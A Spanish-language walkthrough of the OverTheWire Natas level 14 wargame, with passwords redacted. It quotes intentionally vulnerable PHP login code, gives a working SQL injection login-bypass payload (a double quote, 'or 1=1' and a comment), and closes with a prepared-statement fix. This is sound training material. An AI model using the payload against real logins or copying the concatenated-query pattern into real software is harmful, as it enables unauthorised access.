# Natas Level 14 → Level 15

> ⚠️ Spoilers: las contraseñas están omitidas (`[redacted]`). Lo importante es el método.

- **URL:** `http://natas14.natas.labs.overthewire.org`
- **Credenciales:** `natas14` / `[redacted]`

## Análisis y Explotación
La aplicación muestra un formulario de login (username + password). El código construye la query SQL concatenando los inputs del usuario **directamente**, sin sanitización:

```php
$query = "SELECT * from users where username=\"".$_REQUEST["username"]."\" and password=\"".$_REQUEST["password"]."\"";

if(mysqli_num_rows(mysqli_query($link, $query)) > 0) {
    echo "Successful login! The password for natas15 is <censored>";
} else {
    echo "Access denied!";
}
```

Si la query retorna al menos una fila, el login pasa. No hay prepared statements ni escape de caracteres.

### Ataque: SQL Injection — login bypass con `OR 1=1`

La query se arma pegando partes fijas con el input del usuario:

```
SELECT * from users where username="[TU INPUT]" and password="[TU INPUT]"
```

Al meter una comilla doble (`"`) dentro del campo `username`, se cierra antes de tiempo el string del username — y lo que venga después de esa comilla se interpreta como **código SQL nuevo**, no como texto.

**Payload en el campo username:**
```
" or 1=1 -- 
```
(con un espacio después de los dos guiones)

**Password:** cualquier cosa (ej. `xxx`) — queda comentada y no importa.

**Query resultante:**
```sql
SELECT * from users where username="" or 1=1 -- " and password="xxx"
```

Desglose:
- `username=""` → string vacío, nadie en la DB tiene ese username
- `or 1=1` → siempre verdadero; el `OR` convierte toda la condición `WHERE` en TRUE
- `-- ` → comentario SQL; anula todo lo que sigue, incluyendo la validación de password

La query retorna todas las filas de la tabla → `mysqli_num_rows() > 0` → login exitoso.

- **Password obtenida (`natas15`):** `[redacted]`

## Lección aprendida
La concatenación directa de input del usuario en queries SQL es la causa raíz de SQL Injection. La defensa correcta es usar **prepared statements** (sentencias preparadas) con parámetros enlazados (`?` o `:nombre`), de modo que el motor SQL nunca interprete el input como código. Con `mysqli`:

```php
$stmt = mysqli_prepare($link, "SELECT * from users where username=? and password=?");
mysqli_stmt_bind_param($stmt, "ss", $_REQUEST["username"], $_REQUEST["password"]);
mysqli_stmt_execute($stmt);
```

Así, cualquier comilla o palabra SQL que meta el usuario queda como texto literal, nunca como instrucción.
